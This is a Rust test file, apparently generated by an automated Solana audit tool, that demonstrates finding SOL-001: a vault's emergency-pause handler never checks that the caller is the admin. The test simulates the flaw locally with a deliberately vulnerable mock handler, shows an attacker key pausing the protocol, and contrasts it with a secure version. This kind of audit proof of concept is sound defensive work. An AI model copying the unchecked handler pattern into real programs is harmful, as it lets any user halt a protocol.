//! Auto-generated Exploit PoC by Solana Security Swarm
//! Finding: SOL-001 â€” Missing Access Control on Emergency Pause
//! Target: handle_emergency_pause (vulnerable-vault)
//! Impact: Griefing â€” any user can pause the entire protocol
//!
//! Attack: Call emergency_pause with any signer â€” the handler
//! never checks _caller against emergency_state.admin.

use solana_program::pubkey::Pubkey;

const ADMIN:    [u8; 32] = [1u8; 32];  // legitimate admin
const ATTACKER: [u8; 32] = [2u8; 32];  // random malicious signer

#[test]
fn test_exploit_emergency_pause_no_access_control() {
    println!("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
    println!("â•‘  SOL-001: Emergency Pause Missing ACL PoC       â•‘");
    println!("â•‘  Target: vulnerable_vault::handle_emergency_pauseâ•‘");
    println!("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!();

    // Simulated EmergencyState â€” admin is ADMIN
    let admin_key = Pubkey::new_from_array(ADMIN);
    let attacker_key = Pubkey::new_from_array(ATTACKER);
    let mut is_paused = false;
    let mut pause_reason = String::new();

    println!("[SETUP] Emergency state admin: {}", admin_key);
    println!("[SETUP] Attacker key:          {}", attacker_key);
    println!("[SETUP] is_paused:             {}", is_paused);
    println!();

    // Simulated vulnerable handler â€” no admin check
    fn vulnerable_pause(
        _state_admin: &Pubkey,
        _caller: &Pubkey,   // NOT CHECKED
        is_paused: &mut bool,
        pause_reason: &mut String,
        reason: &str,
    ) {
        // BUG: should be `require!(*_state_admin == *_caller)`
        *is_paused = true;
        *pause_reason = reason.to_string();
    }

    // Attacker calls pause â€” succeeds despite not being admin
    vulnerable_pause(
        &admin_key,
        &attacker_key,
        &mut is_paused,
        &mut pause_reason,
        "protocol under attack (spoofed!)",
    );

    println!("[EXPLOIT] Attacker called emergency_pause");
    println!("          is_paused:     {}", is_paused);
    println!("          pause_reason:  {}", pause_reason);
    println!();

    // Verify the secure version would reject
    fn secure_pause(
        state_admin: &Pubkey,
        caller: &Pubkey,
    ) -> Result<(), &'static str> {
        if state_admin != caller {
            return Err("Unauthorized");
        }
        Ok(())
    }

    let secure_result = secure_pause(&admin_key, &attacker_key);

    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    println!("âœ… EXPLOIT: Attacker paused protocol without admin authority");
    println!("ğŸ›¡ï¸  Secure version result: {:?}", secure_result);
    println!("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");

    assert!(is_paused, "Protocol must be paused by attacker");
    assert!(secure_result.is_err(), "Secure version must reject non-admin");
}
